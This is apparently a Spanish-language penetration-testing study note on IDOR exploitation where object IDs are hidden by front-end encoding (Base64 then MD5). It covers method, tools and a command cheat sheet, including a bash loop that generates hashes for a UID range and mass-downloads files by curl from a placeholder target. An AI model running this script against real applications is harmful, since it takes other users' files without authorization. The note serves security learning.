---
tags:
  - webapp
  - IDOR
  - bypass
  - attack
---
## Conceptos Clave (TL;DR)

* Las aplicaciones web a menudo intentan ocultar las referencias directas a objetos (como un UID) aplicando codificación o hashing (ej. formato MD5), lo que dificulta la enumeración directa.
* El uso de scripts intermediarios (como `download.php`) es una práctica común para evitar enlaces directos a archivos, requiriendo el envío del identificador ofuscado.
* Si la lógica de codificación o hashing se realiza en el front-end (JavaScript), el código es visible para el atacante, exponiendo la función exacta utilizada.
* Al descubrir la función en el código fuente, es posible replicar el proceso exacto (ej. Base64 seguido de MD5) para generar identificadores válidos de otros usuarios y explotar el IDOR.

## Herramientas Clave

* **Burp Suite (Interceptor & Comparer):** Para capturar la petición inicial que contiene el parámetro codificado/hasheado y para hacer fuzzing de valores comparándolos con el hash objetivo.
* **Herramientas de línea de comandos (md5sum, base64, tr):** Para replicar localmente la lógica de ofuscación encontrada en el front-end.
* **cURL / Bash Scripting:** Para automatizar la generación de hashes iterativos y la descarga masiva de archivos.

## Metodología Paso a Paso

1. **Interceptar y Analizar:** Captura la petición (generalmente POST o GET) que interactúa con el objeto y localiza el parámetro ofuscado. El objetivo es identificar la longitud y el posible formato del hash (ej. MD5).
2. **Fuzzing Manual Básico:** Intenta aplicar hashes estándar a valores conocidos propios (como tu propio UID, nombre de usuario o nombre de archivo) y compara el resultado con el hash de la petición.
3. **Análisis de Código Fuente (Function Disclosure):** Revisa los archivos JavaScript y el código fuente HTML en busca de la función que desencadena la petición. Identifica qué variables se están tomando y qué algoritmos se les aplican (ej. `CryptoJS.MD5(btoa(uid))`).
4. **Replicación de la Lógica:** Utiliza la terminal para emular la cadena de transformaciones exactas que hace el JavaScript. Verifica que el output coincida perfectamente con el hash interceptado en el paso 1.
5. **Enumeración Masiva:** Una vez validada la lógica, crea un bucle en bash que itere sobre un rango de UIDs, genere el hash correspondiente para cada uno y envíe la petición HTTP para extraer la información.

## Cheat Sheet de Comandos

```bash
# Calcular el hash MD5 de un valor simple sin saltos de línea para evitar alterar el hash final
echo -n <UID> | md5sum

  
# Replicar lógica combinada: Codificar en Base64 sin saltos de línea y luego aplicar MD5
echo -n <UID> | base64 -w 0 | md5sum
 

# Generar hashes en bucle para un rango de UIDs y limpiar el output (eliminar espacios y guiones)
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

  
# Script completo para enumeración masiva y descarga de archivos mediante IDOR ofuscado

#!/bin/bash
for i in {1..10}; do
    # Genera el hash replicando la lógica del front-end y limpia el formato
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        # Realiza la petición POST enviando el hash generado para descargar el archivo remoto
        curl -sOJ -X POST -d "<PARAMETER_NAME>=$hash" http://<TARGET_IP>:<TARGET_PORT>/<ENDPOINT.php>
    done
done
```

## "Gotchas" y Troubleshooting

* **Cuidado con los saltos de línea (Newlines):** Al usar `echo` y `base64` en Linux, por defecto se añaden saltos de línea que alteran completamente el resultado del hash MD5 final. Es obligatorio usar la flag `-n` con `echo` y la flag `-w 0` con `base64` para evitar esto.

* **Caracteres basura en el output de md5sum:** El comando `md5sum` suele imprimir el hash seguido de un espacio y un guion (ej. `hash -`). Debes usar `tr -d ' -'` para limpiar la cadena antes de inyectarla en tus peticiones curl.

* **Hashes impredecibles:** Si el hash no se genera en el front-end y no coincide con valores básicos de tu perfil, podría ser un valor único o una combinación de múltiples valores hasheados en el backend (Secure Direct Object Reference real), lo que haría inviable este bypass específico.